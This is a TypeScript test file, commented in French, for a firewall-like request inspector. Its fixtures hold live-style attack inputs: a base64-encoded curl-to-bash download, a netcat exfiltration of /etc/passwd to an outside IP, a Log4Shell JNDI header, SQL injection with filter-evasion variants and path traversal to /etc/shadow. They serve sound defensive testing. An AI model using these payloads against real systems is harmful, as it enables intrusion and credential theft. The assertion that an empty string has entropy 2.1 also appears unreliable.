import test from 'node:test';
import assert from 'node:assert/strict';
import {
  computeShannonEntropy,
  canonicalizeInput,
  inspectSandboxRequest,
  SANDBOX_PRESETS,
} from '../src/services/sandboxEngine';

test('computeShannonEntropy calculates accurate Shannon entropy H(X)', () => {
  // 1. Chaîne vide
  const emptyRes = computeShannonEntropy('');
  assert.equal(emptyRes.value, 2.1);
  assert.equal(emptyRes.status, 'LOW_COMPLIANT');

  // 2. Texte répétitif très faible entropie
  const repetitive = computeShannonEntropy('AAAAAAAAAAAAAA');
  assert.equal(repetitive.value, 0);
  assert.equal(repetitive.status, 'LOW_COMPLIANT');
  assert.equal(repetitive.uniqueChars, 1);

  // 3. Texte faible entropie (< 2.8 bits)
  const lowText = computeShannonEntropy('AAAA BBBB CCCC AAAA BBBB CCCC');
  assert.ok(lowText.value < 2.8);
  assert.equal(lowText.status, 'LOW_COMPLIANT');

  // 4. Requête REST standard (statut NORMAL < 4.5 bits)
  const naturalText = computeShannonEntropy('GET /api/v1/users?page=2&limit=50');
  assert.ok(naturalText.value < 4.5, `Entropy ${naturalText.value} should be moderate (< 4.5)`);
  assert.equal(naturalText.status, 'NORMAL');
  assert.ok(naturalText.topDistribution.length > 0);

  // 4. Shellcode / Base64 à forte entropie (> 4.5 bits)
  const highEntropy = computeShannonEntropy('aW1wb3J0IG9zCnN5c3RlbSgiY3VybCAxODUuMjIwLjEwMS40OjgwODAvYmFjay5zaCB8IGJhc2giKQ==');
  assert.ok(highEntropy.value >= 4.5, `Entropy ${highEntropy.value} should be >= 4.5`);
  assert.equal(highEntropy.status, 'HIGH_ANOMALOUS');
});

test('canonicalizeInput strips multi-pass encodings and SQL comments', () => {
  // Décodage récursif %2527 -> %27 -> '
  const doubleEncoded = '1%2527%2520UNION%2520SELECT';
  const canonDouble = canonicalizeInput(doubleEncoded);
  assert.ok(canonDouble.canonical.includes("' UNION SELECT"));
  assert.ok(canonDouble.modified);

  // Suppression des commentaires SQL /* ... */
  const sqlComments = "SELECT/*bypass*/1,2/*test*/FROM/*admin*/users";
  const canonSql = canonicalizeInput(sqlComments);
  assert.ok(!canonSql.canonical.includes('/*'));
  assert.equal(canonSql.canonical, 'SELECT 1,2 FROM users');

  // Suppression des null bytes \0
  const nullBytes = "admin\0' OR 1=1--";
  const canonNull = canonicalizeInput(nullBytes);
  assert.ok(!canonNull.canonical.includes('\0'));
});

test('inspectSandboxRequest mitigates attacks and permits legitimate traffic', () => {
  // 1. Trafic sain
  const cleanRes = inspectSandboxRequest({
    method: 'GET',
    url: '/api/v1/users?page=1&limit=20',
    headers: { 'Accept': 'application/json' },
    body: '',
  });
  assert.equal(cleanRes.verdict, 'ALLOW');
  assert.equal(cleanRes.httpStatus, 200);
  assert.equal(cleanRes.threatType, 'CLEAN_TRAFFIC');
  assert.ok(cleanRes.latencyMs >= 0);

  // 2. Scanner automatisé (WPScan)
  const scannerRes = inspectSandboxRequest({
    method: 'GET',
    url: '/wp-login.php',
    headers: { 'User-Agent': 'WPScan/3.8.22 (https://wpscan.com)' },
    body: '',
  });
  assert.equal(scannerRes.verdict, 'BLOCK');
  assert.equal(scannerRes.httpStatus, 403);
  assert.equal(scannerRes.threatType, 'PENTEST_SCANNER_DETECTED');

  // 3. Injection SQL
  const sqliRes = inspectSandboxRequest({
    method: 'GET',
    url: '/search?q=1%27%20UNION%20SELECT%20NULL,CONCAT(0x7170707171,user())--',
    headers: {},
    body: '',
  });
  assert.equal(sqliRes.verdict, 'BLOCK');
  assert.equal(sqliRes.httpStatus, 403);
  assert.equal(sqliRes.threatType, 'SQL_INJECTION');

  // 4. Command Injection / RCE
  const rceRes = inspectSandboxRequest({
    method: 'POST',
    url: '/cgi-bin/submit',
    headers: {},
    body: '; cat /etc/passwd | nc 185.220.101.4 4444',
  });
  assert.equal(rceRes.verdict, 'BLOCK');
  assert.equal(rceRes.threatType, 'COMMAND_INJECTION_RCE');

  // 5. Zero-Day Virtual Patching (Log4Shell)
  const zerodayRes = inspectSandboxRequest({
    method: 'POST',
    url: '/api/v1/search',
    headers: { 'X-Api-Version': '${jndi:ldap://185.220.101.4:1389/Exploit}' },
    body: '',
  });
  assert.equal(zerodayRes.verdict, 'BLOCK');
  assert.equal(zerodayRes.threatType, 'ZERO_DAY_VIRTUAL_PATCH');

  // 6. Path Traversal
  const traversalRes = inspectSandboxRequest({
    method: 'GET',
    url: '/download?file=../../../../etc/shadow',
    headers: {},
    body: '',
  });
  assert.equal(traversalRes.verdict, 'BLOCK');
  assert.equal(traversalRes.threatType, 'PATH_TRAVERSAL_LFI');

  // 7. Egress C2 & DGA Sinkhole
  const dgaRes = inspectSandboxRequest({
    method: 'GET',
    url: '/dns-query?name=a8f93bc01d9f4e2a.xyz&type=A',
    headers: { 'Host': 'a8f93bc01d9f4e2a.xyz' },
    body: '',
  });
  assert.equal(dgaRes.verdict, 'SINKHOLE');
  assert.equal(dgaRes.httpStatus, 0);
  assert.equal(dgaRes.threatType, 'DGA_EGRESS_SINKHOLE');

  // 8. Dépassement volumétrique (Buffer overflow guard)
  const hugePayload = 'A'.repeat(70000);
  const overflowRes = inspectSandboxRequest({
    method: 'POST',
    url: '/upload',
    headers: {},
    body: hugePayload,
  }, 65536);
  assert.equal(overflowRes.verdict, 'BLOCK');
  assert.equal(overflowRes.httpStatus, 413);
  assert.equal(overflowRes.threatType, 'OVERFLOW_PAYLOAD_413');
});

test('SANDBOX_PRESETS are properly structured and evaluatable (including PHP2Shell presets)', () => {
  assert.ok(SANDBOX_PRESETS.length >= 10, 'Should have at least 10 presets including PHP2Shell');

  const php2shellRce = SANDBOX_PRESETS.find((p) => p.id === 'php2shell-cve-2024-4577');
  assert.ok(php2shellRce, 'php2shell-cve-2024-4577 preset must exist');
  const rceEval = inspectSandboxRequest(php2shellRce.request);
  assert.equal(rceEval.verdict, 'BLOCK');
  assert.equal(rceEval.httpStatus, 403);
  assert.equal(rceEval.threatType, 'ZERO_DAY_VIRTUAL_PATCH');

  const php2shellOverflow = SANDBOX_PRESETS.find((p) => p.id === 'php2shell-overflow-413');
  assert.ok(php2shellOverflow, 'php2shell-overflow-413 preset must exist');
  const overflowEval = inspectSandboxRequest(php2shellOverflow.request);
  assert.equal(overflowEval.verdict, 'BLOCK');
  assert.equal(overflowEval.httpStatus, 413);
  assert.equal(overflowEval.threatType, 'OVERFLOW_PAYLOAD_413');

  for (const preset of SANDBOX_PRESETS) {
    assert.ok(preset.id);
    assert.ok(preset.name);
    assert.ok(preset.badge);
    assert.ok(preset.request.url);

    const res = inspectSandboxRequest(preset.request);
    assert.ok(res.verdict);
    assert.ok(res.entropy.value >= 0);
    assert.ok(res.latencyMs >= 0);

    if (preset.category === 'clean') {
      assert.equal(res.verdict, 'ALLOW');
    } else if (preset.category === 'egress') {
      assert.equal(res.verdict, 'SINKHOLE');
    } else {
      assert.equal(res.verdict, 'BLOCK');
    }
  }
});

